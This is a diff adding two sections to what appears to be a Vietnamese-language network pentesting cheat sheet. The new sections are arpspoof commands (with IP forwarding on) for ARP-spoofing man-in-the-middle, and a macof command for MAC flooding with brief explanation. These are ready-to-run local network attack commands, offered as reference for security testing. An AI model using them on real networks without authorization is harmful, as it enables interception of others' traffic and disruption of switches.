@@ -222,3 +222,21 @@ set arp.spoof.fullduplex true #If true, both the targets and the gateway will be
 set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
 ```
 
+#### Arpspoof
+
+```
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -t 192.168.1.1 192.168.1.2
+arpspoof -t 192.168.1.2 192.168.1.1
+```
+
+#### MAC Flooding - CAM overflow
+
+Gây tràn địa chỉ MAC, đây là phương thức gửi nhiều gói tin với địa chỉ MAC nguồn khác nhau, với một số thiết bị khi bị ảnh hưởng sẽ kích hoạt cho phép bypass.
+
+```
+macof -i <interface>
+```
+
+Với các thiết bị chuyển mạch ( Switch ) hiện đại hiện nay thường đã được khắc phục điểm yếu trên.
+
